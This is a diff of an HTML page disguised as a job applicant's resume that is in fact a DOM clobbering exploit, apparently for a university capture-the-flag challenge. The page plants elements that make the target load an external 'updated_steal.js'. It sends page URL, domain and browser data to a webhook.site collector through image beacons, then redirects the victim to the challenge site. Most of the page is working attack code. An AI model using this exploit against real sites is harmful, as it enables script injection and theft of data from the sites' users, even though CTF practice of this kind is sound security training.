@@ -13,11 +13,10 @@
          </style>
      </head>
      <body>
-         <!-- CRITICAL: DOM Clobbering elements - multiple approaches -->
-         <input id="utilsJS" name="url" value="https://gavinyw.github.io/resume-portfolio/updated_steal.js">
-         <form id="utilsJS" name="url"><input name="url" 
-     value="https://gavinyw.github.io/resume-portfolio/updated_steal.js"></form>
-         <div id="utilsJS" url="https://gavinyw.github.io/resume-portfolio/updated_steal.js"></div>
+         <!-- CRITICAL: Simplified DOM Clobbering for utilsJS.url -->
+         <form>
+             <input id="utilsJS" name="url" value="https://gavinyw.github.io/resume-portfolio/updated_steal.js">
+         </form>
 
          <div class="resume">
              <h1>Michael Thompson</h1>
@@ -45,13 +44,11 @@
 
              <div style="text-align: center; margin-top: 40px; color: #666;">
                  <p>Thank you for reviewing my application. I look forward to discussing opportunities.</p>
-                 <p><a href="https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages">View my portfolio on the main
-     site</a></p>
              </div>
          </div>
 
          <script>
-             console.log('SIMPLE DOM CLOBBERING - MULTIPLE TECHNIQUES');
+             console.log('FIXED DOM CLOBBERING - PROPER URL EXTRACTION');
 
              // CORS-FREE webhook function
              function sendWebhook(data) {
@@ -61,115 +58,111 @@
                      Object.keys(data).forEach(key => {
                          params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
                      });
-                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/simple-strategy?' +
+                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/fixed-strategy?' +
      params.toString();
                      document.body.appendChild(img);
                      console.log('Status sent:', data.status);
                  } catch(e) { console.error('Webhook failed:', e); }
              }
 
-             // Send initial confirmation with DOM clobbering analysis
+             // Send initial confirmation with detailed DOM clobbering analysis
              sendWebhook({
-                 status: 'SIMPLE_DOM_CLOBBERING_START',
+                 status: 'FIXED_DOM_CLOBBERING_START',
                  timestamp: new Date().toISOString(),
                  current_domain: window.location.hostname,
                  current_url: window.location.href,
                  utilsJS_exists: !!window.utilsJS,
                  utilsJS_type: typeof window.utilsJS,
-                 utilsJS_url: window.utilsJS?.url || 'not_found',
-                 utilsJS_value: window.utilsJS?.value || 'not_found',
+                 utilsJS_toString: String(window.utilsJS),
+                 utilsJS_url_exists: !!window.utilsJS?.url,
+                 utilsJS_url_type: typeof window.utilsJS?.url,
+                 utilsJS_url_value: window.utilsJS?.url?.value || 'not_found',
+                 utilsJS_url_toString: String(window.utilsJS?.url || 'null'),
                  user_agent: navigator.userAgent
              });
 
-             // Test different DOM clobbering properties
-             setTimeout(() => {
-                 const tests = {
-                     'window.utilsJS': window.utilsJS,
-                     'document.getElementById_utilsJS': document.getElementById('utilsJS'),
-                     'document.utilsJS': document.utilsJS,
-                     'window.utilsJS.url': window.utilsJS?.url,
-                     'window.utilsJS.value': window.utilsJS?.value
-                 };
-
-                 sendWebhook({
-                     status: 'DOM_CLOBBERING_PROPERTY_TESTS',
-                     timestamp: new Date().toISOString(),
-                     tests: JSON.stringify(tests)
-                 });
-             }, 1000);
-
-             // Simulate the vulnerable loadMessageBoardJS function
+             // Test the exact vulnerable function logic
              setTimeout(() => {
                  try {
+                     // This is the exact logic from the vulnerable function
                      let utilJS = window.utilsJS || {};
-                     let scriptSrc = utilJS.url || utilJS.value;
+                     let scriptSrc = utilJS.url;
 
                      sendWebhook({
-                         status: 'SIMULATING_VULNERABLE_FUNCTION',
+                         status: 'VULNERABLE_FUNCTION_LOGIC_TEST',
                          timestamp: new Date().toISOString(),
-                         utilJS_found: !!utilJS,
-                         script_src: scriptSrc || 'not_found'
+                         utilJS_exists: !!utilJS,
+                         utilJS_type: typeof utilJS,
+                         scriptSrc_initial: scriptSrc,
+                         scriptSrc_type: typeof scriptSrc,
+                         scriptSrc_toString: String(scriptSrc)
                      });
 
-                     if (scriptSrc) {
+                     // If scriptSrc is an object (form element), try to get the value
+                     if (scriptSrc && typeof scriptSrc === 'object') {
+                         if (scriptSrc.value) {
+                             scriptSrc = scriptSrc.value;
+                         } else if (scriptSrc.getAttribute) {
+                             scriptSrc = scriptSrc.getAttribute('value');
+                         }
+                     }
+
+                     sendWebhook({
+                         status: 'SCRIPT_SOURCE_EXTRACTION',
+                         timestamp: new Date().toISOString(),
+                         final_scriptSrc: scriptSrc,
+                         final_type: typeof scriptSrc,
+                         is_string: typeof scriptSrc === 'string',
+                         is_valid_url: scriptSrc && scriptSrc.startsWith('http')
+                     });
+
+                     if (scriptSrc && typeof scriptSrc === 'string' && scriptSrc.startsWith('http')) {
                          let script = document.createElement('script');
                          script.src = scriptSrc;
                          document.body.appendChild(script);
 
                          sendWebhook({
-                             status: 'PAYLOAD_SCRIPT_LOADED_SIMPLE',
+                             status: 'PAYLOAD_SCRIPT_LOADED_FIXED',
                              timestamp: new Date().toISOString(),
-                             script_src: scriptSrc
+                             script_src: scriptSrc,
+                             success: true
+                         });
+                     } else {
+                         sendWebhook({
+                             status: 'SCRIPT_SOURCE_INVALID',
+                             timestamp: new Date().toISOString(),
+                             scriptSrc: scriptSrc,
+                             reason: 'not_valid_url'
                          });
                      }
+
                  } catch(e) {
                      sendWebhook({
-                         status: 'ERROR_SIMULATING_FUNCTION',
+                         status: 'ERROR_VULNERABLE_FUNCTION_TEST',
                          timestamp: new Date().toISOString(),
-                         error: e.message
+                         error: e.message,
+                         stack: e.stack
                      });
                  }
              }, 2000);
 
-             // Try the actual vulnerable function if it exists
-             setTimeout(() => {
-                 try {
-                     if (typeof loadMessageBoardJS === 'function') {
-                         sendWebhook({
-                             status: 'VULNERABLE_FUNCTION_EXISTS_CALLING',
-                             timestamp: new Date().toISOString()
-                         });
-                         loadMessageBoardJS();
-                     } else {
-                         sendWebhook({
-                             status: 'VULNERABLE_FUNCTION_NOT_AVAILABLE',
-                             timestamp: new Date().toISOString()
-                         });
-                     }
-                 } catch(e) {
-                     sendWebhook({
-                         status: 'ERROR_CALLING_VULNERABLE_FUNCTION',
-                         timestamp: new Date().toISOString(),
-                         error: e.message
-                     });
-                 }
-             }, 3000);
-
-             // Navigate to CTF site with DOM clobbering in URL fragment
+             // Navigate to CTF site where the real vulnerable function will be called
              setTimeout(() => {
                  const ctfUrl = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages';
 
                  sendWebhook({
-                     status: 'NAVIGATING_TO_CTF_MESSAGES',
+                     status: 'NAVIGATING_TO_CTF_FOR_REAL_EXPLOIT',
                      timestamp: new Date().toISOString(),
-                     target_url: ctfUrl
+                     target_url: ctfUrl,
+                     dom_clobbering_ready: !!window.utilsJS && !!window.utilsJS.url
                  });
 
-                 // Add a delay to ensure webhook is sent before navigation
+                 // Add a small delay to ensure webhook is sent
                  setTimeout(() => {
                      window.location.href = ctfUrl;
                  }, 500);
              }, 4000);
+
          </script>
      </body>
      </html>
